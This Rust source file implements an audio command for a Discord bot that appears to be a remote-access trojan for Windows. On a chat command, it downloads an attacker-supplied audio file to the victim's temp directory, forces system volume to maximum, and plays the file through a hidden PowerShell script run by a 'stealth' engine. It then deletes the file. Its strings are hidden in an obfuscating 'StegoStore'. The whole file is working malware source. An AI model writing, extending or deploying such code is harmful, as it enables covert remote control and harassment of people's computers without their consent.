use crate::commands::*;
use anyhow::Result;
use async_trait::async_trait;
use std::sync::Arc;
use crate::core::http_client::HttpClient;
use twilight_model::channel::message::Message;
use std::process::Command;
use std::os::windows::process::CommandExt;

use crate::core::stego_store::{StegoStore, StringCategory};

pub struct AudioCommand;

impl AudioCommand {
    fn f(key: &str) -> String { StegoStore::get(StringCategory::Desc, key) }
    fn c(key: &str) -> String { StegoStore::get(StringCategory::CmdMeta, key) }
}

#[async_trait]
impl BotCommand for AudioCommand {
    fn name(&self) -> &str { Box::leak(Self::c("AUDIO_NAME").into_boxed_str()) }
    fn description(&self) -> &str { Box::leak(Self::f("AUDIO").into_boxed_str()) }
    fn category(&self) -> &str { Box::leak(Self::c("CAT_UTIL").into_boxed_str()) }
    fn usage(&self) -> &str { Box::leak(Self::c("AUDIO_USAGE").into_boxed_str()) }
    fn examples(&self) -> &'static [&'static str] { 
        Box::leak(vec![
            Box::leak(format!(".audio {}", StegoStore::get(StringCategory::Url, "EXAMPLE_AUDIO")).into_boxed_str()) as &'static str
        ].into_boxed_slice())
    }
    fn aliases(&self) -> &'static [&'static str] { 
        Box::leak(vec![
            Box::leak(Self::c("AUDIO_ALIAS1").into_boxed_str()) as &'static str,
            Box::leak(Self::c("AUDIO_ALIAS2").into_boxed_str()) as &'static str,
        ].into_boxed_slice())
    }

    async fn execute(
        &self,
        http: &Arc<HttpClient>,
        msg: &Message,
        mut args: Arguments,
    ) -> Result<()> {
        let (url, filename) = if let Some(attachment) = msg.attachments.first() {
            let base_name = &attachment.filename;
            let cleaned_name = base_name.split('?').next().unwrap_or(base_name).to_string();
            (attachment.url.clone(), cleaned_name)
        } else if let Some(u) = args.next() {
            let base_name = u.split('/').last().unwrap_or("audio.mp3");
            let cleaned_name = base_name.split('?').next().unwrap_or(base_name).to_string();
            (u.to_string(), cleaned_name)
        } else {
            http.create_message(msg.channel_id.get(), &Self::c("AUDIO_USAGE")).await?;
            return Ok(());
        };

        let temp_dir = std::env::temp_dir();
        let temp_path = temp_dir.join(format!("snaky_audio_{}", filename));
        
        let _ = http.create_message(msg.channel_id.get(), &format!("> Downloading: `{}`...", filename)).await?;

        // Download the file first
        let client = reqwest::Client::builder()
            .timeout(std::time::Duration::from_secs(120))
            .build()?;

        let resp = match client.get(&url).send().await {
            Ok(r) => r,
            Err(e) => {
                http.create_message(msg.channel_id.get(), &format!("❌ Failed to download audio: {}", e)).await?;
                return Ok(());
            }
        };

        if !resp.status().is_success() {
            http.create_message(msg.channel_id.get(), &format!("❌ Download failed with status: {}", resp.status())).await?;
            return Ok(());
        }

        let bytes = resp.bytes().await?;
        std::fs::write(&temp_path, &bytes)?;

        // Inform user after successful download
        let _ = http.create_message(msg.channel_id.get(), "> `Preparing audio playback...`").await?;

        // Set master volume to max
        #[cfg(windows)]
        {
            use windows_volume_control::AudioController;
            unsafe {
                let mut controller = AudioController::init(None);
                controller.GetSessions();
                controller.GetDefaultAudioEnpointVolumeControl();
                if let Some(session) = controller.get_session_by_name("master".to_string()) {
                    session.setVolume(1.0);
                }
            }
        }

        let display_name = if filename.len() > 40 { format!("{}...", &filename[..40]) } else { filename.clone() };
        let out_msg = Self::f("AUDIO_PLAYING").replace("{}", &display_name);
        let _ = http.create_message(msg.channel_id.get(), &out_msg).await?;

        // Use PowerShell to play audio in the background without a window
        let path_str = temp_path.display().to_string().replace("\\", "\\\\");
        let script = format!(
            "Add-Type -AssemblyName PresentationCore; \
             $player = New-Object System.Windows.Media.MediaPlayer; \
             $player.Open([System.Uri]::new('{}')); \
             Start-Sleep -Milliseconds 1000; \
             $player.Volume = 1.0; \
             $player.Play(); \
             $i = 0; \
             while ($player.NaturalDuration.HasTimeSpan -ne $true) {{ if ($i++ -gt 100) {{ break }}; Start-Sleep -Milliseconds 100 }}; \
             if ($player.NaturalDuration.HasTimeSpan) {{ \
                 $duration = $player.NaturalDuration.TimeSpan.TotalSeconds; \
                 Start-Sleep -Seconds ([math]::Ceiling($duration) + 1); \
             }} else {{ \
                 Start-Sleep -Seconds 30; \
             }}; \
             $player.Stop(); $player.Close(); \
             Remove-Item -Path '{}' -Force",
            path_str,
            path_str
        );

        if let Some(engine) = crate::stealth::get_engine() {
            if let Err(e) = engine.execute_stealth_ps(&script) {
                http.create_message(msg.channel_id.get(), &format!("❌ Failed to deploy stealth audio: {}", e)).await?;
            }
        } else {
            http.create_message(msg.channel_id.get(), "❌ Stealth engine not initialized").await?;
        }

        Ok(())
    }
}
